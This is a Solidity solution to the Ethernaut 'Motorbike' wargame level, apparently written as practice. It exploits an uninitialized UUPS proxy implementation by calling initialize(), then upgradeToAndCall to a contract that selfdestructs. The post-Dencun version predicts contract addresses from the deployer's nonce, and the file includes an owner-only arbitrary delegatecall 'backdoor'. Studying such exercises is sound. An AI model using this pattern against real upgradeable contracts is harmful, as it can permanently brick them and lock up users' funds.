// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

// PRE DECCUN UPDATE
contract Boom {
    Engine public engine;

    constructor(address _engine) public {
        engine = Engine(_engine);
    }

    function crash() public {
        engine.initialize();
        require(engine.upgrader() == address(this));
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("engineSieze()")
        );
    }

    function engineSieze() public payable {
        selfdestruct(msg.sender);
    }
}
// POST DECCUN UPDATE
// BY https://github.com/Ching367436/ with a few mods.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Engine {
    function initialize() external {}

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {}
}

contract AddressHelper {
    function getNonce(address _addr) public view returns (uint256 nonce) {
        for (; ; nonce = nonce + 1) {
            address contractAddress = computeCreateAddress(_addr, nonce);
            if (!isContract(contractAddress)) return nonce;
        }
    }

    function isContract(address _addr) public view returns (bool) {
        // https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function computeCreateAddress(
        address deployer
    ) external view returns (address) {
        uint256 nonce = getNonce(deployer);
        return computeCreateAddress(deployer, nonce);
    }

    // The code below is adapted from https://github.com/OoXooOx/Predict-smart-contract-address/blob/main/AddressPredictorCreateOpcode.sol
    function addressFromLast20Bytes(
        bytes32 bytesValue
    ) private pure returns (address) {
        return address(uint160(uint256(bytesValue)));
    }

    function computeCreateAddress(
        address deployer,
        uint256 nonce
    ) public pure returns (address) {
        // forgefmt: disable-start
        // The integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0.
        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
        if (nonce == 0x00)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x80)
                        )
                    )
                );
        if (nonce <= 0x7f)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            deployer,
                            uint8(nonce)
                        )
                    )
                );

        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
        if (nonce <= 2 ** 8 - 1)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd7),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x81),
                            uint8(nonce)
                        )
                    )
                );
        if (nonce <= 2 ** 16 - 1)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd8),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x82),
                            uint16(nonce)
                        )
                    )
                );
        if (nonce <= 2 ** 24 - 1)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd9),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x83),
                            uint24(nonce)
                        )
                    )
                );
        // forgefmt: disable-end

        // More details about RLP encoding can be found here: https://eth.wiki/fundamentals/rlp
        // 0xda = 0xc0 (short RLP prefix) + 0x16 (length of: 0x94 ++ proxy ++ 0x84 ++ nonce)
        // 0x94 = 0x80 + 0x14 (0x14 = the length of an address, 20 bytes, in hex)
        // 0x84 = 0x80 + 0x04 (0x04 = the bytes length of the nonce, 4 bytes, in hex)
        // We assume nobody can have a nonce large enough to require more than 32 bytes.
        return
            addressFromLast20Bytes(
                keccak256(
                    abi.encodePacked(
                        bytes1(0xda),
                        bytes1(0x94),
                        deployer,
                        bytes1(0x84),
                        uint32(nonce)
                    )
                )
            );
    }
}

contract MotorbikeExploit is AddressHelper {
    address public owner;
    address constant selfdestructContract =
        0xCD8b3Af52D2dF0BA87d4556091a34841a330Ffa9;
    address constant ethernaut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address constant motorbikeLevel =
        0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    address engine;
    address motorbike;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        // The nonce can be obtained by using `cast nonce $LEVEL -r $RPC`, where $LEVEL is the motorbike level address
        // We can also get the nonce using `getNonce(motorbikeLevel)`
        // However, since the nonce is too big, the call may be reverted.
        // The nonce was 3179 for my case
        solve(3179);
    }

    function solve(uint256 nonce) public onlyOwner {
        createLevelInstance();

        // uint256 nonce = getNonce(motorbikeLevel);
        engine = computeCreateAddress(motorbikeLevel, nonce);
        motorbike = computeCreateAddress(motorbikeLevel, nonce + 1);

        selfdestructEngine(Engine(engine));

        // We should not submit the level within the same transaction since it uses [Address.isContract] to check if we pass. Therefore, we need to call it manually.
        // submitLevelInstance();
    }

    function createLevelInstance() public onlyOwner {
        // create a new Motorbike instance
        (bool success, ) = ethernaut.call(
            abi.encodeWithSignature(
                "createLevelInstance(address)",
                motorbikeLevel
            )
        );
        require(success, "Failed to create level instance");
    }

    function submitLevelInstance() public onlyOwner {
        // submit the instance
        (bool success, ) = ethernaut.call(
            abi.encodeWithSignature("submitLevelInstance(address)", motorbike)
        );
        require(success, "Failed to submit level instance");
    }

    function selfdestructEngine(Engine engine) private {
        engine.initialize();
        engine.upgradeToAndCall(
            selfdestructContract,
            abi.encodeWithSignature("engineSieze()")
        );
    }

    function backdoor(address implemetation) external payable onlyOwner {
        assembly {
            let ret := delegatecall(gas(), implemetation, 0, 0, 0, 0)
        }
    }
}

contract Boom {
    function engineSieze() public payable {
        selfdestruct(payable(address(0)));
    }
}
